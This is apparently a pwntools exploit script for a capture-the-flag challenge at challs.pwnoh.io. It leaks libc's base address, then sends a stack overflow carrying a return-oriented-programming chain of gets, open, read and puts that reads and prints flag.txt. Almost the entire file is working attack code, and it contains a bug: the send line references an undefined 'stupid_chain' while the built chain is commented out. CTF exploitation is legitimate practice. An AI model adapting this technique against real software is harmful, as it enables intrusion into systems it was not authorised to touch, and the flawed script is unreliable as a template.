#! /usr/bin/python
from pwn import *

context.update(
        arch="amd64",
        endian="little", log_level="debug", os="linux",
        terminal=["alacritty","-e"]
)

to = 2
ru = lambda p,s: p.recvuntil(s, timeout=to)
rl = lambda p: p.recvline()
sla = lambda p,a,b: p.sendlineafter(a, b, timeout=to)
sl = lambda p,a: p.sendline(a)
up = lambda b: int.from_bytes(b, byteorder="little")

SERVICE = "challs.pwnoh.io"
PORT = 13371


def start(binary):

    gs = '''
        set context-sections stack regs disasm
        set show-compact-regs on
        set resolve-heap-via-heuristic on
        set follow-fork-mode parent
    '''

    if args.GDB:
        return gdb.debug(binary, gdbscript=gs)
    elif args.REMOTE:
        return remote(SERVICE,PORT)
    else:
        return process(binary)


def exploit(p,e,l):
    
    pad = b"A" * 40

    ru(p,b"at ")
    l.address = int(rl(p).strip(b"\n"),16) - l.sym["system"]
    log.info(f"Leaked libc base {hex(l.address)}")
    

    r = ROP(l)
    pop_rdi = r.find_gadget(["pop rdi", "ret"])[0]
    
    #flag = b"/srv/app/flag.txt"
    #0x000000000002be51 : pop rsi ; ret
    pop_rsi = l.address + 0x2be51
    #0x00000000000904a9 : pop rdx ; pop rbx ; ret
    pop_rdx_rbx = l.address + 0x904a9
    #0x000000000003d1ee : pop rcx ; ret
    pop_rcx = l.address + 0x3d1ee

    one_gadget = l.address + 0xebd43 

    flag = b"flag.txt"

    payload = flag

    writeable_addr = l.address + 0x21ace8

    chain = p64(pop_rdi) + p64(writeable_addr)
    chain += p64(l.sym["gets"])
     
    # Open /srv/app/flag.txt
    chain += p64(pop_rdi) + p64(writeable_addr)
    chain += p64(pop_rsi) + p64(0)
    chain += p64(l.sym["open"])

    fd = 3 # Possibly brute force this

    # Read in flag
    chain += p64(pop_rdi) + p64(fd) + p64(pop_rsi) + p64(writeable_addr)
    chain += p64(pop_rdx_rbx) + p64(0x30) + p64(0)
    chain += p64(l.sym["read"])

    # Puts flag
    chain += p64(pop_rdi) + p64(writeable_addr)
    chain += p64(l.sym["puts"])

    #sl(p,pad+chain)
    sl(p,pad+stupid_chain)

    sl(p,payload)
    p.interactive()
    

if __name__=="__main__":
    file = args.BIN

    p = start(file)
    e = context.binary = ELF(file)
    l = ELF("./libc.so.6")

    exploit(p,e,l)
